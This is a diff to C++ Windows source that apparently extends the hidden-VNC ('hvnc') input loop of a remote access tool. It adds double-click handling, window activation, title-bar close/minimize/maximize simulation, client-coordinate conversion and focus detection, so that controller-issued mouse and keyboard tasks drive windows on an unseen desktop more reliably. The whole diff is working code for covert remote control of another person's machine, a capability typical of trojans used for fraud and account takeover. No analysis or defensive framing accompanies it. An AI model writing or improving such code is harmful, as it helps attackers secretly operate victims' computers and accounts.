@@ -342,20 +342,49 @@ static void input_loop() {
 
         if (task.action.find("hvnc_mouse") != string::npos) {
             LRESULT hitTest = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(x, y));
+            UINT msg = 0;
+            WPARAM wParam = 0;
 
             if (task.action == "hvnc_mousemove") {
                 PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
                 PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hitTest, WM_MOUSEMOVE));
+            } else if (task.action == "hvnc_doubleclick") {
+                int btn = task.cmd.value("button", 0);
+                if (hitTest != HTCLIENT) {
+                    msg = (btn == 0) ? WM_NCLBUTTONDBLCLK : (btn == 1 ? WM_NCRBUTTONDBLCLK : WM_NCMBUTTONDBLCLK);
+                    wParam = hitTest;
+                } else {
+                    HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
+                    if (hChild && hChild != hwnd) hwnd = hChild;
+                    msg = (btn == 0) ? WM_LBUTTONDBLCLK : (btn == 1 ? WM_RBUTTONDBLCLK : WM_MBUTTONDBLCLK);
+                    wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+                }
             } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
                 int btn = task.cmd.value("button", 0);
-                UINT msg = 0;
-                WPARAM wParam = 0;
 
                 if (task.action == "hvnc_mousedown") {
-                    SetForegroundWindow(hwnd);
+                    HWND hTop = GetAncestor(hwnd, GA_ROOT);
+                    SendMessageW(hwnd, WM_MOUSEACTIVATE, (WPARAM)hTop, MAKELPARAM(hitTest, (btn == 0 ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN))));
+                    SetForegroundWindow(hTop);
                     SetFocus(hwnd);
+                    SendMessageW(hTop, WM_ACTIVATE, WA_CLICKACTIVE, 0);
 
                     if (hitTest != HTCLIENT) {
+                        if (btn == 0) {
+                            if (hitTest == HTCAPTION) {
+                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MOVE + 2, MAKELPARAM(x, y));
+                                continue;
+                            } else if (hitTest == HTCLOSE) {
+                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_CLOSE, MAKELPARAM(x, y));
+                                continue;
+                            } else if (hitTest == HTMINBUTTON) {
+                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, MAKELPARAM(x, y));
+                                continue;
+                            } else if (hitTest == HTMAXBUTTON) {
+                                PostMessageW(hwnd, WM_SYSCOMMAND, SC_MAXIMIZE, MAKELPARAM(x, y));
+                                continue;
+                            }
+                        }
                         msg = (btn == 0) ? WM_NCLBUTTONDOWN : (btn == 1 ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN);
                         wParam = hitTest;
                     } else {
@@ -389,21 +418,36 @@ static void input_loop() {
                         msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
                     }
                 }
-                PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                if (msg >= WM_LBUTTONDOWN && msg <= WM_MBUTTONDBLCLK) {
+                    POINT clientPt = pt;
+                    ScreenToClient(hwnd, &clientPt);
+                    PostMessageW(hwnd, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
+                } else {
+                    PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
+                }
             }
         } else if (task.action.find("hvnc_key") != string::npos) {
             int vk = task.cmd.value("keycode", 0);
-            HWND hFocus = GetFocus();
-            if (!hFocus) hFocus = GetForegroundWindow();
+            HWND hFocus = NULL;
+            HWND hFore = GetForegroundWindow();
+            if (hFore) {
+                DWORD tid = GetWindowThreadProcessId(hFore, NULL);
+                GUITHREADINFO gti = { sizeof(gti) };
+                if (GetGUIThreadInfo(tid, &gti) && gti.hwndFocus) {
+                    hFocus = gti.hwndFocus;
+                } else {
+                    hFocus = hFore;
+                }
+            }
             if (!hFocus) hFocus = hwnd;
 
             if (task.action == "hvnc_keydown") {
-                SendMessageW(hFocus, WM_KEYDOWN, vk, 0);
+                PostMessageW(hFocus, WM_KEYDOWN, vk, 0);
                 if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) || vk == VK_SPACE || vk == VK_RETURN || vk == VK_BACK) {
-                    SendMessageW(hFocus, WM_CHAR, vk, 0);
+                    PostMessageW(hFocus, WM_CHAR, vk, 0);
                 }
             } else {
-                SendMessageW(hFocus, WM_KEYUP, vk, 0);
+                PostMessageW(hFocus, WM_KEYUP, vk, 0);
             }
         }
     }
